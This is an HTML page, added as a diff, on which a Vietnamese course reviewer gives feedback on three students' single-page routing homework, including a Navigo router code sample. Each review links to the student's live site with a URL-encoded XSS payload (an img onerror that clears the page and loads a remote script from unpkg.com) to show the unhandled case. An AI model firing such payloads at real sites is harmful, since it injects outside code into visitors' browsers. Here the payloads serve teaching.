@@ -1,0 +1,71 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><link rel="shortcut icon" href="../../../assets/images/favicon.ico" type="image/x-icon" /><title>Fullstack_nodeJs_K2/Day40</title><link rel="stylesheet" href="../../../assets/css/style.css" /></head><body><h1>Dương review bài tập về nhà buổi 40 - Lớp K2</h1>
+<h2><a href="https://github.dev/Apeiron2/F8-fullstack-K2/tree/main/homework/day_40_Bundler/src">Vũ Đức Tài</a></h2>
+<ul>
+<li>
+<p>[x] Bài 1</p>
+<p>Bài làm tốt</p>
+<p>Các đoạn code và xử lý đều rất tốt</p>
+<p>Vì Error cũng là trang, nên đưa vào chung với pages để có thể xử lý được nhiều hơn</p>
+<p>Xử lý phần re-render chưa được tốt khiến cho khi chuyển trang thì re-render lại cả trang thay vì phần cần thay đổi.</p>
+<p>Chưa xử lý case <strong><a href="https://apeironsepdhust.io.vn/san-pham/%3Cimg%0A%20%20src%3D%22%22%0A%20%20onerror%3D%27b%3Ddocument%2Ca%3Db.body%3Ba.innerHTML%3D%22%22%3Ba.appendChild%28c%20%3D%20b.createElement%28%22script%22%29%2Cc.type%3D%22module%22%2Cc.innerHTML%3D%60import%20%7BHTML%7D%20from%20%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%22%3BHTML%28%22h1%22%2C%20%22error%22%2C%20%22HACKED%21%22%29%60%29%3Ba.appendChild%28d%3Db.createElement%28%22link%22%29%2Cd.rel%3D%22stylesheet%22%2Cd.href%3D%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%2Fstyle.css%22%29%3B%27%0A%2F%3E">XSS</a></strong></p>
+<p>Phần anh đang lỗi trang 404, anh thử theo cách của em làm xem sao nhé:</p>
+<pre><code class="language-js">const render = (callback) =&gt; {
+  root.innerHTML = callback();
+};
+
+const router = new Navigo('/');
+
+router
+  .on({
+    '/': () =&gt; {
+      render(Home);
+    },
+    '/index.html': () =&gt; {
+      render(Home);
+    },
+    '/about': () =&gt; {
+      render(About);
+    },
+    '*': () =&gt; {
+      render(NotFound);
+    },
+  })
+  .notFound(() =&gt; {
+    render(NotFound);
+  })
+  .resolve();
+</code></pre>
+</li>
+<li>
+<p>[x] Đánh giá chung bài tập về nhà: Bài làm tốt, tuy nhiên chưa xử lý <strong>kỹ</strong> các case.</p>
+</li>
+</ul>
+<h2><a href="https://router-dom-daithehh04.vercel.app/product">Nguyễn Đại Thế</a></h2>
+<ul>
+<li>
+<p>[x] Bài 1</p>
+<p>Bài làm tốt*</p>
+<p>Các đoạn code và xử lý đều rất tốt</p>
+<p>Xử lý phần re-render rất được tốt.</p>
+<p>Vì Error cũng là trang, nên đưa vào chung với pages để có thể xử lý được nhiều hơn</p>
+<p>Chưa xử lý case <strong><a href="https://router-dom-daithehh04.vercel.app/product/%3Cimg%0A%20%20src%3D%22%22%0A%20%20onerror%3D%27b%3Ddocument%2Ca%3Db.body%3Ba.innerHTML%3D%22%22%3Ba.appendChild%28c%20%3D%20b.createElement%28%22script%22%29%2Cc.type%3D%22module%22%2Cc.innerHTML%3D%60import%20%7BHTML%7D%20from%20%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%22%3BHTML%28%22h1%22%2C%20%22error%22%2C%20%22HACKED%21%22%29%60%29%3Ba.appendChild%28d%3Db.createElement%28%22link%22%29%2Cd.rel%3D%22stylesheet%22%2Cd.href%3D%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%2Fstyle.css%22%29%3B%27%0A%2F%3E">XSS</a></strong></p>
+</li>
+<li>
+<p>[x] Đánh giá chung bài tập về nhà: Bài làm tốt, tuy nhiên chưa xử lý <strong>kỹ</strong> các case.</p>
+</li>
+</ul>
+<h2><a href="https://github.com/DuyChinh/f8-fullstack-KS2/tree/main/Day-40/Day-40-SinglePage">Đoàn Duy Chinh</a></h2>
+<ul>
+<li>
+<p>[x] Bài 1</p>
+<p>Bài làm tốt</p>
+<p>Các đoạn code và xử lý đều rất tốt</p>
+<p>Vì Error cũng là trang, nên đưa vào chung với pages để có thể xử lý được nhiều hơn</p>
+<p>Xử lý phần re-render chưa được tốt khiến cho khi chuyển trang thì re-render lại cả trang thay vì phần cần thay đổi.</p>
+<p>Chưa xử lý case <strong><a href="https://test-six-lyart-57.vercel.app/san-pham/%3Cimg%0A%20%20src%3D%22%22%0A%20%20onerror%3D%27b%3Ddocument%2Ca%3Db.body%3Ba.innerHTML%3D%22%22%3Ba.appendChild%28c%20%3D%20b.createElement%28%22script%22%29%2Cc.type%3D%22module%22%2Cc.innerHTML%3D%60import%20%7BHTML%7D%20from%20%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%22%3BHTML%28%22h1%22%2C%20%22error%22%2C%20%22HACKED%21%22%29%60%29%3Ba.appendChild%28d%3Db.createElement%28%22link%22%29%2Cd.rel%3D%22stylesheet%22%2Cd.href%3D%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%2Fstyle.css%22%29%3B%27%0A%2F%3E">XSS</a></strong></p>
+</li>
+<li>
+<p>[x] Đánh giá chung bài tập về nhà: Bài làm tốt, tuy nhiên chưa xử lý <strong>kỹ</strong> các case.</p>
+</li>
+</ul>
+<script src="../../../assets/js/pages.js" defer></script></body></html>
